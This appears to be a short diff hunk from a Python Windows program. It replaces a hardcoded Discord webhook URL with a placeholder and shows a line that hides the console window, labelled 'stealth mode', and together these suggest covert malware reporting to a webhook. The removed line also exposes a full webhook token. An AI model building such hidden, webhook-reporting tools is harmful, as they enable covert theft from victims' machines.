@@ -22,7 +22,7 @@ import threading
 
 w = wmi.WMI()
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1376592022047031487/QJ3LEybP19w6YPUCeXLu-Of_N1TazAKUxHtZrequ4ecPeKuSIImWmy4e8HL91Bsebn_H"
+WEBHOOK_URL = "ADD_YOUR_WEBHOOK_URL_HERE!"
 
 # Hide the console window (stealth mode)
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
